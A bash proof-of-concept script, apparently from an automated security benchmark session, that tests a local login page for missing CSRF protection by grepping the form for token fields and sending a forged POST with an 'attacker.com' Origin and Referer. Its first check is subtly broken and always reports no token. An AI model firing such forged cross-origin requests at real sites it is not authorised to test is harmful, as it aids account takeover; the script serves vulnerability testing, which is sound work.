#!/bin/bash
# POC: This POC demonstrates the absence of CSRF token protection by: 1) Fetching the login form and showing it contains no csrf_token field, 2) Attempting a POST request from a cross-origin source (simulating an attacker's site) and showing the server processes it without CSRF validation
# Target: ./repo
# Created: 2025-11-04T19:23:32.124Z
# Session: benchmark-XBEN-019-24-mhkyd1c6

# CSRF Vulnerability POC - No Token Validation
# This script demonstrates the absence of CSRF token protection

TARGET="${1:-http://localhost:5000}"
OUTPUT_DIR="/tmp/csrf_poc_$$"
mkdir -p "$OUTPUT_DIR"

echo "[*] CSRF Token Validation Check"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Fetch the login form and check for CSRF token
echo "[+] Step 1: Checking if login form contains CSRF token..."
FORM_HTML=$(curl -s "$TARGET/login")

# Check for various CSRF token field patterns
if echo "$FORM_HTML" | grep -qiE "(csrf_token|_token|__RequestVerificationToken|authenticity_token)" | grep -q "input"; then
    echo "[-] CSRF token field detected in form - protection may be present"
    echo "[+] Token field found:"
    echo "$FORM_HTML" | grep -iE "(csrf_token|_token|__RequestVerificationToken|authenticity_token)" | head -3
else
    echo "[!] NO CSRF token field found in login form!"
    echo "[!] This indicates the form is vulnerable to CSRF attacks"
fi

echo ""
echo "[+] Step 2: Demonstrating cross-origin POST request..."
echo "[+] Simulating POST request from attacker domain..."

# Step 2: Attempt POST from cross-origin with various origin headers
RESPONSE=$(curl -s -i -X POST "$TARGET/login" \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser&password=testpass" 2>&1)

echo "[+] Response Status and Headers:"
echo "$RESPONSE" | head -20
echo ""

# Step 3: Check if request was processed (200/302 response indicates no CSRF check)
STATUS=$(echo "$RESPONSE" | head -1)
echo "[+] Server Response Status: $STATUS"

if echo "$STATUS" | grep -qE "(200|302|303|307)"; then
    echo "[!] CRITICAL: Server accepted cross-origin POST without CSRF validation!"
    echo "[!] The application did not reject the request or validate a CSRF token"
    echo "[!] This confirms CSRF vulnerability"
    EXIT_CODE=0
else
    echo "[?] Server returned error status - CSRF check may be present"
    EXIT_CODE=1
fi

echo ""
echo "[+] Step 3: Checking for CSRF-related response headers..."
echo "[+] Looking for SameSite cookie attribute..."

# Check for SameSite cookie protection
if echo "$RESPONSE" | grep -qi "SameSite"; then
    echo "[+] SameSite cookie attribute detected"
else
    echo "[-] NO SameSite cookie attribute found - no alternative CSRF protection"
fi

# Check for Origin validation
if echo "$RESPONSE" | grep -qi "origin\|referer"; then
    echo "[+] Origin/Referer header checking may be present"
else
    echo "[-] NO Origin/Referer validation detected"
fi

echo ""
echo "[+] Step 4: Analyzing form structure..."
echo "$FORM_HTML" | grep -A 5 -B 2 "form" | head -20

echo ""
echo "[RESULT] CSRF Token Validation Status:"
if echo "$FORM_HTML" | grep -qiE "csrf|token|verification" > /dev/null 2>&1; then
    # More thorough check for actual input fields
    if echo "$FORM_HTML" | grep -qiE "<input[^>]*(csrf_token|_token|__RequestVerificationToken|authenticity_token)[^>]*>" ; then
        echo "[-] CSRF protection appears to be implemented"
        exit 1
    fi
fi

echo "[!] VULNERABLE: No CSRF token protection detected"
echo "[!] The application accepts cross-origin POST requests without validation"
exit 0